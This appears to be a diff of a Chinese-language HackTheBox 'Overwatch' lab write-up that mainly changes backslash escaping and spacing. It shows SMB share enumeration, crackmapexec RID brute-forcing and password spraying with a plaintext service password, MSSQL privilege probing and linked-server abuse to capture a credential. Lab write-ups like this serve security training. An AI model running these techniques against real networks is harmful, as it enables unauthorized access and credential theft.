@@ -95,14 +95,14 @@ $ smbclient -L //10.129.10.76 -N # 先列出有哪些sharename
         SYSVOL          Disk      Logon server share
 SMB1 disabled -- no workgroup available
 $ smbclient //10.129.10.76/software$ -N # 連線software$這個
-smb: \> dir
+smb: \\> dir
   .                                  DH        0  Sat May 17 09:27:07 2025
   ..                                DHS        0  Thu Jan  1 14:46:47 2026
   Monitoring                         DH        0  Sat May 17 09:32:43 2025
 
                 7147007 blocks of size 4096. 2294658 blocks available
-smb: \> cd Monitoring\
-smb: \Monitoring\> dir
+smb: \\> cd Monitoring\
+smb: \Monitoring\\> dir
   .                                  DH        0  Sat May 17 09:32:43 2025
   ..                                 DH        0  Sat May 17 09:27:07 2025
   EntityFramework.dll                AH  4991352  Fri Apr 17 04:38:42 2020
@@ -123,11 +123,11 @@ smb: \Monitoring\> dir
   x86                                DH        0  Sat May 17 09:32:33 2025
 
                 7147007 blocks of size 4096. 2294658 blocks available
-smb: \Monitoring\> get overwatch.exe
-smb: \Monitoring\> get overwatch.exe.config
-smb: \Monitoring\> get overwatch.pdb
-smb: \Monitoring\> get System.Data.SQLite.dll
-smb: \Monitoring\> q
+smb: \Monitoring\\> get overwatch.exe
+smb: \Monitoring\\> get overwatch.exe.config
+smb: \Monitoring\\> get overwatch.pdb
+smb: \Monitoring\\> get System.Data.SQLite.dll
+smb: \Monitoring\\> q
 $ file overwatch.exe
 overwatch.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows
 ```
@@ -185,7 +185,7 @@ Warning: Remote path completions is disabled due to ruby limitation: quoting_det
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\> dir
+*Evil-WinRM* PS C:\\> dir
 
 Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
 
@@ -206,7 +206,7 @@ Error: Exiting with code 1
 * password spraying: 也沒有什麼進展，而且很慢
     ```bash
     # 既然我們已經有foothold，那麼現在可以enum username
-    $ crackmapexec smb 10.129.244.81 -u sqlsvc -p 'TI0LKcfHzZw1Vv' --rid-brute | grep SidTypeUser | awk -F "OVERWATCH" '{print $2}' | cut -d '\' -f2 | cut -d ' ' -f1 > ./users.txt
+    $ crackmapexec smb 10.129.244.81 -u sqlsvc -p 'TI0LKcfHzZw1Vv' --rid-brute | grep SidTypeUser | awk -F "OVERWATCH" '{print $2}' | cut -d '\\' -f2 | cut -d ' ' -f1 > ./users.txt
     $ crackmapexec smb 10.129.244.81 -u users.txt -p 'Password123'
     ```
 
@@ -233,8 +233,8 @@ PORT     STATE SERVICE  VERSION
 |_ssl-date: 2026-03-22T16:58:41+00:00; +8s from scanner time.
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port6520-TCP:V=7.80%I=7%D=3/23%Time=69C01FB7%P=x86_64-pc-linux-gnu%r(ms
-SF:-sql-s,25,"\x04\x01\0%\0\0\x01\0\0\0\x15\0\x06\x01\0\x1b\0\x01\x02\0\x1
-SF:c\0\x01\x03\0\x1d\0\0\xff\x10\0\x03\xe8\0\0\0\0");
+SF:-sql-s,25,"\x04\x01\\0%\\0\\0\\x01\\0\\0\\0\\x15\\0\x06\x01\\0\x1b\\0\x01\x02\\0\x1
+SF:c\\0\x01\x03\\0\x1d\\0\\0\xff\x10\\0\x03\xe8\\0\\0\\0\\0");
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
@@ -267,7 +267,9 @@ SQL (OVERWATCH\sqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
 SQL (OVERWATCH\sqlsvc  guest@master)> EXEC sp_configure 'show advanced options', 1;
 ERROR(S200401\SQLEXPRESS): Line 105: User does not have permission to perform this action.
 ```
+
 看起來這個帳號的權限真的很低，那就要找其他更高權限的帳號或是提權，先嘗試「最簡單的提權」
+
 ```sql
 SQL (OVERWATCH\sqlsvc  guest@master)> EXEC sp_configure 'xp_cmdshell', 1;
 ERROR(S200401\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
@@ -277,7 +279,9 @@ SQL (OVERWATCH\sqlsvc  guest@master)> select grantee_principal_id,grantor_princi
 grantee_principal_id   grantor_principal_id   permission_name
 --------------------   --------------------   ---------------
 ```
+
 簡單的提權無果後，可以嘗試撈資料
+
 ```sql
 SQL (OVERWATCH\sqlsvc  guest@master)> SELECT name FROM sys.server_principals;
 name
@@ -325,7 +329,9 @@ SQL (OVERWATCH\sqlsvc  dbo@overwatch)> SELECT * FROM Eventlog;
 Id   Timestamp   EventType   Details
 --   ---------   ---------   -------
 ```
+
 資料也沒有什麼特別的，那就可以嘗試Linked Server
+
 ```sql
 SQL (OVERWATCH\sqlsvc  dbo@overwatch)> EXEC sp_linkedservers;
 SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
@@ -341,6 +347,7 @@ INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server
 INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
 ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64].
 ```
+
 代表有Linked server - <span style="background-color: yellow">SQL07</span>，但也沒辦法執行shell，基本上所有本地的feature都已經用盡，那就可以嘗試網路相關的feature
 
 ### MSSQL - Network
@@ -423,7 +430,7 @@ SQL Server
     ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
     ```
 
-<img src="/assets/posts/HackTheBox/Overwatch-1.png" width=300>
+<img src="/assets/posts/HackTheBox/Overwatch-1.png">
 這是MSSQL Server - `S200401\SQLEXPRESS`自己連線`SQL07`時的credential
 
 * Username: `sqlmgmt`
